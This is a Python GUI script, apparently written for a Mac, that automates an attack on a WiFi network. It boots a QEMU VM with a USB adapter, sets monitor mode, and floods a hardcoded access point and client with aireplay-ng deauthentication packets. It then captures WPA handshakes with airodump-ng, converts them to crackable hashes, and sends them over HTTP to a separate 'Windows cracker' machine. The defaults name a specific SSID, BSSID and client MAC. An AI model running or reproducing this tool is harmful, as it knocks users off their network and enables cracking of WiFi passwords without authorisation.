#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Mac WiFi Capture App (double-click GUI)
========================================
Pipeline: launch QEMU (Alpine qcow2 + custom initramfs + DWA-160 USB)
          -> wait for boot + firmware load
          -> SSH into VM, set wlan0 monitor mode
          -> airodump-ng + aireplay-ng deauth storm (target SSID/BSSID/ch)
          -> hcxpcapngtool -> .22000 hash
          -> POST hash to Windows cracker (port 8766)
No terminal interaction required (this GUI drives everything).
"""
import tkinter as tk
from tkinter import scrolledtext, messagebox
import subprocess
import threading
import time
import json
import urllib.request
import os

# ---------- fixed QEMU / VM paths (on the Mac) ----------
QEMU_BIN    = '/opt/homebrew/bin/qemu-system-aarch64'
QCOW2       = '/tmp/alpine-root.qcow2'
KERNEL      = '/tmp/alpine-boot/boot/vmlinuz-lts'
INITRD      = '/tmp/initramfs-custom'
SERIAL_LOG  = '/tmp/vm_app_serial.log'
MON_SOCK    = '/tmp/vm_app_monitor.sock'
SSH_KEY     = os.path.expanduser('~/.ssh/vm_tongbao')

# ---------- local offline hash store (on the Mac) ----------
LOCAL_DIR   = os.path.expanduser('~/MacCapture/captures')
LOCAL_HASH  = os.path.join(LOCAL_DIR, 'captures.22000')

# ---------- defaults (32H10F) ----------
DEFAULTS = {
    'ssid':       '32H10F',
    'bssid':      'BC:3E:07:01:DC:98',
    'channel':    '1',
    'client':     'BC:61:93:23:BC:3F',
    'duration':   '300',            # capture window in seconds
    'windows_ip': '192.168.1.107',
    'port':       '8766',
}
VM_SSH = ('ssh -i %s -p 2222 -o ConnectTimeout=20 -o StrictHostKeyChecking=no '
          '-o BatchMode=yes root@127.0.0.1' % SSH_KEY)


class MacCaptureApp:
    def __init__(self, root):
        self.root = root
        root.title('Mac WiFi Capture  (DWA-160  →  32H10F)')
        root.geometry('760x560')
        self.var = {}

        tk.Label(root, text='Target', font=('', 13, 'bold')).grid(
            row=0, column=0, sticky='w', padx=12, pady=(8, 2))
        fields = [('ssid', 'SSID'), ('bssid', 'BSSID'),
                  ('channel', 'Channel'), ('client', 'Client MAC (deauth 目標)')]
        r = 1
        for key, label in fields:
            tk.Label(root, text=label).grid(row=r, column=0, sticky='e', padx=12, pady=3)
            self.var[key] = tk.StringVar(value=DEFAULTS[key])
            tk.Entry(root, textvariable=self.var[key], width=30).grid(
                row=r, column=1, sticky='w', pady=3)
            r += 1
        tk.Label(root, text='Capture 秒數').grid(row=r, column=0, sticky='e', padx=12, pady=3)
        self.var['duration'] = tk.StringVar(value=DEFAULTS['duration'])
        tk.Entry(root, textvariable=self.var['duration'], width=12).grid(row=r, column=1, sticky='w', pady=3)
        r += 1
        tk.Label(root, text='Windows cracker IP').grid(row=r, column=0, sticky='e', padx=12, pady=3)
        self.var['windows_ip'] = tk.StringVar(value=DEFAULTS['windows_ip'])
        tk.Entry(root, textvariable=self.var['windows_ip'], width=18).grid(row=r, column=1, sticky='w', pady=3)
        r += 1
        tk.Label(root, text='Port').grid(row=r, column=0, sticky='e', padx=12, pady=3)
        self.var['port'] = tk.StringVar(value=DEFAULTS['port'])
        tk.Entry(root, textvariable=self.var['port'], width=12).grid(row=r, column=1, sticky='w', pady=3)
        r += 1

        self.btn = tk.Button(root, text='▶  開始抓包', command=self.start, font=('', 12, 'bold'))
        self.btn.grid(row=r, column=0, sticky='e', pady=10, padx=12)
        self.btn_resend = tk.Button(root, text='🔄 重送本機 hash', command=self.resend, font=('', 11, 'bold'))
        self.btn_resend.grid(row=r, column=1, sticky='w', pady=10, padx=12)

        tk.Label(root, text='Log', font=('', 11, 'bold')).grid(
            row=r + 1, column=0, columnspan=2, sticky='w', padx=12)
        self.log = scrolledtext.ScrolledText(root, height=16, width=84)
        self.log.grid(row=r + 2, column=0, columnspan=2, padx=12, pady=8)
        self.logline('就緒。DWA-160 要插上 Mac；Windows cracker 沒開也行（hash 會存本機，之後按「重送」）。')
        if os.path.exists(LOCAL_HASH):
            with open(LOCAL_HASH) as _f:
                _n = sum(1 for _line in _f if _line.strip())
            self.logline('💾 本機已存 %d 個 hash（%s）' % (_n, LOCAL_HASH))

    # ---- helpers ----
    def logline(self, msg):
        def _append():
            self.log.insert('end', msg + '\n')
            self.log.see('end')
            self.root.update_idletasks()
        try:
            self.root.after(0, _append)
        except Exception:
            pass

    def save_local(self, hash_lines):
        """把抓到的 hash 存到 Mac 本機（去重 append）。離線能力核心。"""
        try:
            os.makedirs(LOCAL_DIR, exist_ok=True)
            existing = set()
            if os.path.exists(LOCAL_HASH):
                with open(LOCAL_HASH) as f:
                    existing = set(line.strip() for line in f if line.strip())
            new = [h for h in hash_lines if h not in existing]
            if new:
                with open(LOCAL_HASH, 'a') as f:
                    for h in new:
                        f.write(h + '\n')
            self.logline('   💾 本機已存 %d 個 hash（新增 %d）→ %s' % (
                len(existing) + len(new), len(new), LOCAL_HASH))
            return len(new)
        except Exception as e:
            self.logline('   ⚠️ 存本機失敗: %r' % e)
            return 0

    def post_hashes(self, hashes, ssid, bssid, wip, port):
        """把 hash POST 給 Windows cracker。回傳成功數。第一個失敗就停（Windows 沒開）。"""
        posted = 0
        for i, h in enumerate(hashes):
            payload = {'hash': h, 'ssid': ssid, 'bssid': bssid.lower()}
            try:
                req = urllib.request.Request(
                    'http://%s:%s/api/receive-hash' % (wip, port),
                    data=json.dumps(payload).encode(),
                    headers={'Content-Type': 'application/json'}, method='POST')
                resp = urllib.request.urlopen(req, timeout=15)
                body = resp.read().decode('utf-8', 'replace')
                self.logline('   POST OK: %s' % body[:120])
                posted += 1
            except Exception as e:
                self.logline('   POST FAIL (hash %d/%d): %s' % (i + 1, len(hashes), e))
                if i == 0:
                    self.logline('   → Windows cracker 可能沒開。hash 已存本機，開起來後按「🔄 重送本機 hash」。')
                    break
        return posted

    def resend(self):
        """把 Mac 本機存的 hash 重新 POST 給 Windows（等 Windows 開起來後用）。"""
        wip = self.var['windows_ip'].get().strip()
        port = self.var['port'].get().strip()
        ssid = self.var['ssid'].get().strip()
        bssid = self.var['bssid'].get().strip().upper()
        if not os.path.exists(LOCAL_HASH):
            self.logline('📭 本機沒有存的 hash（%s 不存在）' % LOCAL_HASH)
            return
        with open(LOCAL_HASH) as f:
            hashes = [line.strip() for line in f if line.strip()]
        if not hashes:
            self.logline('📭 本機 hash 檔是空的')
            return
        self.logline('🔄 重送 %d 個本機 hash 到 %s:%s ...' % (len(hashes), wip, port))
        posted = self.post_hashes(hashes, ssid, bssid, wip, port)
        self.logline('   重送完成 %d/%d。%s' % (
            posted, len(hashes),
            '' if posted == len(hashes) else '（沒送完的還在 Mac 本機，Windows 開起來再按重送）'))

    def start(self):
        self.btn.config(state='disabled')
        threading.Thread(target=self.run, daemon=True).start()

    def run(self):
        try:
            ssid    = self.var['ssid'].get().strip()
            bssid   = self.var['bssid'].get().strip().upper()
            ch      = self.var['channel'].get().strip()
            client  = self.var['client'].get().strip().upper()
            dur     = int(self.var['duration'].get().strip() or '300')
            wip     = self.var['windows_ip'].get().strip()
            port    = self.var['port'].get().strip()
            self.logline('=== Mac WiFi Capture: %s (%s) ch%s, %ss ===' % (ssid, bssid, ch, dur))

            # 1. check required files
            missing = [f for f in (QEMU_BIN, QCOW2, KERNEL, INITRD, SSH_KEY) if not os.path.exists(f)]
            if missing:
                for f in missing:
                    self.logline('❌ MISSING: %s' % f)
                self.logline('   /tmp 可能被清掉了 → 重新 build VM，或改用 ~/wifi-vm/。')
                return

            # 2. kill existing QEMU
            self.logline('[1/6] 關閉既有 QEMU ...')
            subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
            time.sleep(2)

            # 3. launch QEMU
            self.logline('[2/6] 啟動 QEMU (qcow2 + custom initramfs + DWA-160) ...')
            os.system('rm -f %s %s' % (SERIAL_LOG, MON_SOCK))
            cmd = ('%s -machine virt -cpu cortex-a72 -m 4096 -smp 4 '
                   '-drive file=%s,format=qcow2 '
                   '-kernel %s -initrd %s -append "console=ttyAMA0" '
                   '-chardev file,id=s0,path=%s,append=on -serial chardev:s0 '
                   '-netdev user,id=n0,hostfwd=tcp:127.0.0.1:2222-10.0.2.15:22 '
                   '-device virtio-net-pci,netdev=n0 '
                   '-device qemu-xhci,id=xhci '
                   '-device usb-host,bus=xhci.0,vendorid=0x148f,productid=0x5572 '
                   '-display none -monitor unix:%s,server,nowait'
                   % (QEMU_BIN, QCOW2, KERNEL, INITRD, SERIAL_LOG, MON_SOCK))
            qemu_proc = subprocess.Popen(cmd, shell=True,
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.logline('   QEMU PID %s。等 95s 開機 + firmware load (rt2870.bin 延遲 load ~64-80s) ...' % qemu_proc.pid)
            time.sleep(95)

            # 4. SSH in + capture
            self.logline('[3/6] SSH 進 VM，開抓包 (monitor + airodump + deauth storm %ss) ...' % dur)
            vm_script = (
                'set +e\n'
                # 清舊 /tmp 檔 (qcow2 root 小, 舊 airodump.log 172M 會塞滿 → cap 檔寫不進)
                'rm -f /tmp/capapp* /tmp/appairodump.log /tmp/appdeauth.log /tmp/airodump.log /tmp/deauth.log 2>/dev/null\n'
                'rm -f /tmp/capfull* /tmp/captest* /tmp/par* /tmp/fg* /tmp/dbg* /tmp/alone* /tmp/mix* /tmp/fresh* 2>/dev/null\n'
                # 等 firmware load + wlan0 ready (rt2870.bin 延遲 load 64-80s)
                'i=0\n'
                'while [ $i -lt 40 ]; do\n'
                '  if iw dev 2>/dev/null | grep -q wlan0 && dmesg 2>/dev/null | grep -q "Firmware detected"; then break; fi\n'
                '  sleep 3; i=$((i+1))\n'
                'done\n'
                'iw dev wlan0 set type monitor 2>/dev/null\n'
                'ifconfig wlan0 up 2>&1\n'
                'sleep 2\n'
                'pkill -9 -f "airodump-ng|aireplay-ng" 2>/dev/null\n'
                'sleep 1\n'
                'rm -f /tmp/capapp* 2>/dev/null\n'
                # deauth storm 背景 (nohup &)
                'nohup aireplay-ng --deauth 9999 --ignore-negative-one -a %s -c %s wlan0 > /dev/null 2>&1 &\n'
                'sleep 3\n'
                # airodump 迴圈 (每次 airodump 提前退出, 跑多次累積 capture)
                'nruns=$((%s / 10)); [ $nruns -lt 1 ] && nruns=1; [ $nruns -gt 30 ] && nruns=30\n'
                'for i in $(seq 1 $nruns); do\n'
                '  timeout 10 airodump-ng -w /tmp/capapp -c %s wlan0 > /dev/null 2>&1\n'
                'done\n'
                'pkill aireplay-ng 2>/dev/null\n'
                'echo "CAP_COUNT:"; ls /tmp/capapp-*.cap 2>/dev/null | wc -l\n'
                'echo "CAP_TOTAL:"; du -sch /tmp/capapp-*.cap 2>/dev/null | tail -1\n'
                'ls /tmp/capapp-*.cap 2>/dev/null | xargs hcxpcapngtool -o /tmp/capapp.22000 2>&1 | tail -3\n'
                'echo "===HASH==="\n'
                'cat /tmp/capapp.22000 2>/dev/null\n'
                'echo "===END==="\n'
                'wc -l /tmp/capapp.22000 2>/dev/null\n'
                % (bssid, client, dur, ch)
            )
            r = subprocess.run(VM_SSH + ' "sh -s"', input=vm_script.encode(),
                               capture_output=True, timeout=dur + 200, shell=True)
            out = (r.stdout or b'').decode('utf-8', 'replace') + (r.stderr or b'').decode('utf-8', 'replace')
            for line in out.splitlines():
                if any(k in line for k in ['===HASH===', '===END===', 'WPA', 'PMKID',
                                           'EAPOL', 'hcxpcapngtool', 'packets inside',
                                           'ESSID', 'ioctl', 'Failed', 'CAP_COUNT',
                                           'CAP_TOTAL', 'processed cap files']):
                    self.logline('   ' + line.strip())

            # extract hash lines
            hash_lines, in_hash = [], False
            for line in out.splitlines():
                if '===HASH===' in line:
                    in_hash = True
                    continue
                if '===END===' in line:
                    in_hash = False
                    continue
                if in_hash and line.strip():
                    hash_lines.append(line.strip())
            self.logline('[4/6] 抓到 %d 行 hash' % len(hash_lines))
            for h in hash_lines:
                self.logline('   HASH: %s' % (h[:64] + ('...' if len(h) > 64 else '')))

            # 4.5 存本機（離線能力：Windows 沒開也保得住）
            if hash_lines:
                self.save_local(hash_lines)
            else:
                self.logline('   💾 本次 0 hash（本機未新增）')

            # 5. POST to Windows（順手；失敗不丟，本機已有）
            self.logline('[5/6] POST %d 個 hash 到 Windows %s:%s ...' % (len(hash_lines), wip, port))
            posted = self.post_hashes(hash_lines, ssid, bssid, wip, port) if hash_lines else 0

            # 6. result
            self.logline('[6/6] 完成。POST 成功 %d/%d。%s' % (
                posted, len(hash_lines),
                '✅ 成功' if posted > 0 else '⚠️ 0 hash（PMKSA timing → 重跑或加大 capture 秒數）'))
            self.logline('=== 結束 ===')
        except Exception as e:
            self.logline('ERROR: %r' % e)
        finally:
            self.btn.config(state='normal')
            # leave QEMU running so user can re-run without re-boot; kill on next start

    def on_close(self):
        # optional: stop QEMU on close
        subprocess.run(['pkill', '-f', 'qemu-system-aarch64'], capture_output=True)
        self.root.destroy()


def main():
    root = tk.Tk()
    app = MacCaptureApp(root)
    root.protocol('WM_DELETE_WINDOW', app.on_close)
    root.mainloop()


if __name__ == '__main__':
    main()
